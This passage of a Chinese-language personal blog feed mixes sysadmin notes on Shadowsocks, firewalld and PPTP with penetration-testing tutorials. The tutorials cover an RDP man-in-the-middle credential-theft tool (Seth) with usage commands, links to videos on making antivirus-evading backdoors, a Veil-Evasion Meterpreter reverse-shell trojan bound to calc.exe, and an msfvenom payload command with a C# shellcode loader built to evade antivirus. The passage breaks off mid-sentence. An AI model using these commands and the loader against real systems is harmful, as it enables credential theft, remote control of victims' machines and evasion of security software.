class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d restart</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先安装 pip ，使用 pip 安装 Shadowsocks &lt;/p&gt;
    
    </summary>
    
      <category term="vps，SS" scheme="https://yaalonsong.github.io/categories/vps%EF%BC%8CSS/"/>
    
    
      <category term="CentOS" scheme="https://yaalonsong.github.io/tags/CentOS/"/>
    
      <category term="shadowscoks" scheme="https://yaalonsong.github.io/tags/shadowscoks/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7 使用 Firewalld 打开关闭防火墙与端口</title>
    <link href="https://yaalonsong.github.io/2018/07/31/CentOS7_firewalld.html"/>
    <id>https://yaalonsong.github.io/2018/07/31/CentOS7_firewalld.html</id>
    <published>2018-07-31T14:23:46.002Z</published>
    <updated>2018-08-22T17:16:45.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="firewalld的基本使用"><a href="#firewalld的基本使用" class="headerlink" title="firewalld的基本使用"></a>firewalld的基本使用</h2><a id="more"></a><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启动： systemctl <span class="built_in">start</span> firewalld （service firewalld <span class="built_in">start</span>）</span><br><span class="line">关闭： systemctl stop firewalld  （service firewalld stop）</span><br><span class="line">查看状态： systemctl status firewalld </span><br><span class="line">开机禁用  ： systemctl disable firewalld</span><br><span class="line">开机启用  ： systemctl enable firewalld</span><br></pre></td></tr></table></figure><h2 id="systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。"><a href="#systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。" class="headerlink" title="systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。"></a>systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">启动一个服务：systemctl <span class="built_in">start</span> firewalld.service</span><br><span class="line">关闭一个服务：systemctl stop firewalld.service</span><br><span class="line">重启一个服务：systemctl restart firewalld.service</span><br><span class="line">显示一个服务的状态：systemctl status firewalld.service</span><br><span class="line">在开机时启用一个服务：systemctl enable firewalld.service</span><br><span class="line">在开机时禁用一个服务：systemctl disable firewalld.service</span><br><span class="line">查看服务是否开机启动：systemctl is-enabled firewalld.service</span><br><span class="line">查看已启动的服务列表：systemctl list-unit-files|grep enabled</span><br><span class="line">查看启动失败的服务列表：systemctl --failed</span><br></pre></td></tr></table></figure><h2 id="配置firewalld-cmd"><a href="#配置firewalld-cmd" class="headerlink" title="配置firewalld-cmd"></a>配置firewalld-cmd</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看版本： firewall-<span class="built_in">cmd</span> --version</span><br><span class="line">查看帮助： firewall-<span class="built_in">cmd</span> --<span class="built_in">help</span></span><br><span class="line">显示状态： firewall-<span class="built_in">cmd</span> --state</span><br><span class="line">查看所有打开的端口： firewall-<span class="built_in">cmd</span> --zone=public --list-ports</span><br><span class="line">更新防火墙规则： firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line">查看区域信息:  firewall-<span class="built_in">cmd</span> --get-active-zones</span><br><span class="line">查看指定接口所属区域： firewall-<span class="built_in">cmd</span> --get-zone-of-interface=eth0</span><br><span class="line">拒绝所有包：firewall-<span class="built_in">cmd</span> --panic-on</span><br><span class="line">取消拒绝状态： firewall-<span class="built_in">cmd</span> --panic-off</span><br><span class="line">查看是否拒绝： firewall-<span class="built_in">cmd</span> --query-panic</span><br></pre></td></tr></table></figure><h2 id="对一个端口的开启-查看-删除操作"><a href="#对一个端口的开启-查看-删除操作" class="headerlink" title="对一个端口的开启/查看/删除操作"></a>对一个端口的开启/查看/删除操作</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加:  firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">444</span>/tcp --permanent    (--permanent永久生效，没有此参数重启后失效)</span><br><span class="line">重新载入:  firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line">查看:  firewall-<span class="built_in">cmd</span> --zone=public --query-port=<span class="number">444</span>/tcp</span><br><span class="line">删除:  firewall-<span class="built_in">cmd</span> --zone=public --remove-port=<span class="number">444</span>/tcp --permanent</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;firewalld的基本使用&quot;&gt;&lt;a href=&quot;#firewalld的基本使用&quot; class=&quot;headerlink&quot; title=&quot;firewalld的基本使用&quot;&gt;&lt;/a&gt;firewalld的基本使用&lt;/h2&gt;
    
    </summary>
    
      <category term="Linux命令" scheme="https://yaalonsong.github.io/categories/Linux%E5%91%BD%E4%BB%A4/"/>
    
    
      <category term="CentOS" scheme="https://yaalonsong.github.io/tags/CentOS/"/>
    
      <category term="firewall" scheme="https://yaalonsong.github.io/tags/firewall/"/>
    
  </entry>
  
  <entry>
    <title>通过降级连接劫持RDP明文凭据</title>
    <link href="https://yaalonsong.github.io/2018/05/03/seth.html"/>
    <id>https://yaalonsong.github.io/2018/05/03/seth.html</id>
    <published>2018-05-03T11:58:46.000Z</published>
    <updated>2018-08-22T17:17:44.928Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。</p></blockquote><a id="more"></a><h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]</span><br><span class="line">实例：</span><br><span class="line">./seth.sh 网口 攻击者IP 访问RDP IP 被攻击者IP &lt;命令执行一般不用&gt;</span><br><span class="line">./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138</span><br><span class="line">与上面命令等价（如果所有机器在同一网段可用）：</span><br><span class="line">./seth.sh eth0 192.168.3.&#123;149,150,138&#125;</span><br></pre></td></tr></table></figure><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><ul><li>项目地址：<a href="https://github.com/SySS-Research/Seth" target="_blank" rel="noopener">Seth</a></li></ul><ul><li>攻击者机器：kali 192.168.3.149</li><li>访问RDP机器：win 7 x64 192.168.3.150</li><li>被攻击者机器：win 10 x64 192.168.3.138</li></ul><blockquote><ol><li>欺骗ARP回复</li><li>启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。</li><li>配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。</li><li>捕获目标主机的SYN数据包。</li><li>克隆SSL证书。<br>重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。</li><li>阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。</li></ol></blockquote><ul><li>seth 执行完的界面：</li></ul><p><img src="/uploads/start.jpg" alt=""></p><ul><li>访问RDP的机器弹出，尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息：</li></ul><p><img src="/uploads/ssl.jpg" alt=""></p><ul><li>成功获取被攻击者RDP的用户名密码：</li></ul><p><img src="/uploads/mm.jpg" alt=""></p><ul><li><p>当以下复选框未选中时被攻击者可以直接登录系统，并且seth可以进行键盘记录。</p><p><img src="/uploads/ms.jpg" alt=""></p></li></ul><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><ul><li>当我使用win 10 做为访问攻击目标RDP的机器时，win 10 直接报错 ，攻击机器显示类似“请确认加密方式是不是xxx”，不能抓到密码（也可能是我环境的问题）。</li><li>使用win 7 做为访问攻击目标RDP的机器，弹出ssl认证那个，未报错，只是进不去mstsc，重新登录即可（攻击机已经断开监听所以可以正常登录）。</li><li>使用win 8 做为访问攻击目标RDP的机器，弹出ssl认证那个，报错（但是不影响，点击重新登录即可登录成功）。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="RDP攻击" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/RDP%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="RDP" scheme="https://yaalonsong.github.io/tags/RDP/"/>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>TheFatRat YouTube 视频</title>
    <link href="https://yaalonsong.github.io/2018/04/27/bypass-av.html"/>
    <id>https://yaalonsong.github.io/2018/04/27/bypass-av.html</id>
    <published>2018-04-26T16:05:58.000Z</published>
    <updated>2018-08-22T17:06:23.759Z</updated>
    
    <content type="html"><![CDATA[<p>TheFatRat<br><a id="more"></a></p><ul><li>Screetsec Channel : <a href="https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw" target="_blank" rel="noopener">https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw</a></li><li>Udate thefatrat v1.8 <a href="https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>file Pumper in linux with fatrat <a href="https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :<a href="https://www.youtube.com/watch?v=mkfKSCxvPec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=mkfKSCxvPec</a></li><li>Embed Backdoor Apk Andoird : <a href="https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be</a></li><li>Create Backdoor Php and Reconnect With TheFatRat : <a href="https://www.youtube.com/watch?v=gfS55fjd8Fg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gfS55fjd8Fg</a></li><li>THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : <a href="https://www.youtube.com/watch?v=C4YHVKPw6Zo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=C4YHVKPw6Zo</a></li><li>Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : <a href="https://www.youtube.com/watch?v=-WbKOxIl_f4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=-WbKOxIl_f4</a></li><li>How to hack android device with FatRat on kali linux 2 :<a href="https://www.youtube.com/watch?v=yUuwnu-NUXE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=yUuwnu-NUXE</a></li><li>Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : <a href="https://www.youtube.com/watch?v=7PMfPbrM0o4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7PMfPbrM0o4</a></li><li>FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=8lJBwclFwJI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8lJBwclFwJI</a></li><li>FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s</a></li><li>FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=wCzsD6vt9CQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wCzsD6vt9CQ</a></li><li>TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :<a href="https://www.youtube.com/watch?v=wuOCDn0NvWc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wuOCDn0NvWc</a></li><li>1000 % FUD Backdoor with TheFatRat Tool : <a href="https://www.youtube.com/watch?v=vPXWv0jaBEQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vPXWv0jaBEQ</a></li><li>How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdoor (Virus) 100% Indetectable | TheFatRat : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :<a href="https://www.youtube.com/watch?v=1SQW9lujjT8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1SQW9lujjT8</a></li><li>Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 <a href="https://www.youtube.com/watch?v=FlXMslSjnGw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=FlXMslSjnGw</a></li><li>TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) <a href="https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>ALL VIDEO IN HERE : <a href="https://www.youtube.com/results?search_query=thefatrat+backdoor" target="_blank" rel="noopener">https://www.youtube.com/results?search_query=thefatrat+backdoor</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TheFatRat&lt;br&gt;
    
    </summary>
    
      <category term="bypass-av" scheme="https://yaalonsong.github.io/categories/bypass-av/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/bypass-av/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="bypass-av" scheme="https://yaalonsong.github.io/tags/bypass-av/"/>
    
  </entry>
  
  <entry>
    <title>Veil-Evasion + pyJoiner 捆绑两个 EXE 的免杀木马</title>
    <link href="https://yaalonsong.github.io/2018/03/09/veil+pyJoiner.html"/>
    <id>https://yaalonsong.github.io/2018/03/09/veil+pyJoiner.html</id>
    <published>2018-03-09T15:29:20.000Z</published>
    <updated>2018-08-22T17:17:49.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。</p><a id="more"></a><h2 id="0x01-在kali-linux-2018-1-安装使用-veil-3-1-1-制作回连木马"><a href="#0x01-在kali-linux-2018-1-安装使用-veil-3-1-1-制作回连木马" class="headerlink" title="0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马"></a>0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马</h2><ul><li><p>Veil-Evasion 制作回连木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil</span><br><span class="line">use 1                        #选择使用 Veil-Evasion 模块</span><br><span class="line">Veil-Evasion Menu</span><br><span class="line">41 payloads loaded</span><br><span class="line">Available Commands:</span><br><span class="line">backGo to main Veil menu</span><br><span class="line">checkvtCheck virustotal against generated hashes</span><br><span class="line">cleanRemove generated artifacts</span><br><span class="line">exitExit Veil</span><br><span class="line">infoInformation on a specific payload</span><br><span class="line">listList available payloads</span><br><span class="line">useUse a specific payload</span><br><span class="line">Veil-Evasion command: use 11        #选择payload</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure><p><img src="/uploads/9.jpg" alt="veil"></p><p>使用以下命令开启监听：</p><p><code>root@kali:~# msfconsole  -r /var/lib/veil/output/handlers/test.rc</code></p></li></ul><h2 id="0x02-配置-pyJoiner—GUI-Version-运行环境"><a href="#0x02-配置-pyJoiner—GUI-Version-运行环境" class="headerlink" title="0x02 配置 pyJoiner—GUI-Version 运行环境"></a>0x02 配置 pyJoiner—GUI-Version 运行环境</h2><p>GitHub 上有两个版本 <a href="https://github.com/danielhnmoreno" target="_blank" rel="noopener">项目地址</a>  ，其中 kali 版必须使用 Kali Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner—GUI-Version。</p><p>本次实验 pyJoiner 运行环境如下：</p><ul><li>Windows 10 </li><li>Python 3.6.3 </li><li>pyinstaller 3.3.1</li></ul><h2 id="0x03-将两个exe文件进行捆绑"><a href="#0x03-将两个exe文件进行捆绑" class="headerlink" title="0x03 将两个exe文件进行捆绑"></a>0x03 将两个exe文件进行捆绑</h2><p>这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下：</p><p><code>py -3 pyJoiner.py</code>         #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD</p><p>打开 GUI 如下图：</p><p><img src="/uploads/10.jpg" alt="GUI"></p><p>实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。</p><p>捆绑后生成的 exe 路径如下：</p><p><img src="/uploads/12.jpg" alt="路径"></p><h2 id="0x04-免杀回连测试"><a href="#0x04-免杀回连测试" class="headerlink" title="0x04 免杀回连测试"></a>0x04 免杀回连测试</h2><p>使用在线查杀引擎 virustotal 的结果如下：</p><p><img src="/uploads/13.jpg" alt="virustotal"></p><p>回连测试：</p><ul><li>目标机 Windows 10</li><li>在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器</li><li><img src="/uploads/14.jpg" alt="calc"></li><li>kali 回连 Meteoreter  session </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.youtube.com/watch?v=vHz8QU2Dj9M" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vHz8QU2Dj9M</a></p><p><a href="https://github.com/danielhnmoreno/pyJoiner---GUI-Version" target="_blank" rel="noopener">https://github.com/danielhnmoreno/pyJoiner---GUI-Version</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="payloads" scheme="https://yaalonsong.github.io/tags/payloads/"/>
    
  </entry>
  
  <entry>
    <title>kali安装pptp和shadowsocks客户端</title>
    <link href="https://yaalonsong.github.io/2018/03/06/kali%E5%AE%89%E8%A3%85pptp+shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html"/>
    <id>https://yaalonsong.github.io/2018/03/06/kali安装pptp+shadowsocks客户端.html</id>
    <published>2018-03-06T13:48:16.000Z</published>
    <updated>2018-08-22T17:17:38.350Z</updated>
    
    <content type="html"><![CDATA[<h4 id="kali-安装-pptp-方法"><a href="#kali-安装-pptp-方法" class="headerlink" title="kali 安装 pptp 方法"></a>kali 安装 pptp 方法</h4><h5 id="依次执行以下命令"><a href="#依次执行以下命令" class="headerlink" title="依次执行以下命令"></a>依次执行以下命令</h5><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome</span><br><span class="line">#以上为一条命令来执行</span><br><span class="line">cp /etc/network/interfaces /etc/network/interfaces.backup </span><br><span class="line">echo &quot;auto lo &quot; &gt; /etc/network/interfaces </span><br><span class="line">echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces </span><br><span class="line">/etc/init.d/network-manager restart</span><br></pre></td></tr></table></figure><h4 id="kali安装ss客户端"><a href="#kali安装ss客户端" class="headerlink" title="kali安装ss客户端"></a>kali安装ss客户端</h4><h5 id="Command-line-Client"><a href="#Command-line-Client" class="headerlink" title="Command-line Client"></a>Command-line Client</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br><span class="line">apt-get install shadowsocks-libev</span><br><span class="line">cpan Net::Shadowsocks</span><br><span class="line">sslocal -s 23.154.235.12 -p 8388  -l 1080 -k password -t 600 -m aes-256-cfb</span><br></pre></td></tr></table></figure><p><em>注释：-s 服务器IP，-p为ss配置的端口，-l 本地代理端口，-k为ss配置的密码</em></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;kali-安装-pptp-方法&quot;&gt;&lt;a href=&quot;#kali-安装-pptp-方法&quot; class=&quot;headerlink&quot; title=&quot;kali 安装 pptp 方法&quot;&gt;&lt;/a&gt;kali 安装 pptp 方法&lt;/h4&gt;&lt;h5 id=&quot;依次执行以下命令&quot;&gt;&lt;a href=&quot;#依次执行以下命令&quot; class=&quot;headerlink&quot; title=&quot;依次执行以下命令&quot;&gt;&lt;/a&gt;依次执行以下命令&lt;/h5&gt;
    
    </summary>
    
      <category term="kali" scheme="https://yaalonsong.github.io/categories/kali/"/>
    
    
      <category term="kali" scheme="https://yaalonsong.github.io/tags/kali/"/>
    
      <category term="pptp" scheme="https://yaalonsong.github.io/tags/pptp/"/>
    
      <category term="ss" scheme="https://yaalonsong.github.io/tags/ss/"/>
    
  </entry>
  
  <entry>
    <title>免杀 MSF Windows Payload 的方法与实践（小白视角）</title>
    <link href="https://yaalonsong.github.io/2017/12/22/%E5%85%8D%E6%9D%80%20MSF%20Windows%20Payload%20%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5.html"/>
    <id>https://yaalonsong.github.io/2017/12/22/免杀 MSF Windows Payload 的方法与实践.html</id>
    <published>2017-12-21T16:01:30.000Z</published>
    <updated>2018-08-22T17:19:03.884Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。</p></blockquote><a id="more"></a><h2 id="0x00-制作payload"><a href="#0x00-制作payload" class="headerlink" title="0x00 制作payload"></a>0x00 制作payload</h2><p>使用 kali 里的 msfvenom 生成一个x86的 Meterpreter Payload 命令如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b <span class="meta-string">"\x00\xff"</span> LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe</span></span><br></pre></td></tr></table></figure><p>大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。</p><p>生成结果 <code>cat https.csharp</code> 如图所示，</p><p><img src="/uploads/11.png" alt="payload"></p><h2 id="0x01-创建-c-项目"><a href="#0x01-创建-c-项目" class="headerlink" title="0x01 创建 c# 项目"></a>0x01 创建 c# 项目</h2><p>我们需要创建一个 C# 项目，我使用的是 Visual Studio 2017。新建一个空白的 C# 的控制台应用(.NET Framework)工程，.Net Framework 版本选择 2.0（保证兼容性）。</p><p>将下列代码粘贴覆盖到 Program.cs 中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Threading;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    public class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public Program()</span><br><span class="line">        &#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunMSF()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            //Paste your Payload here</span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);</span><br><span class="line">            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);</span><br><span class="line">            Thread.Sleep(2000);</span><br><span class="line">        &#125;</span><br><span class="line">        public static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将在 kali 生成的 payload 中的十六进制数数组粘贴到代码中注释为“//Paste your Payload 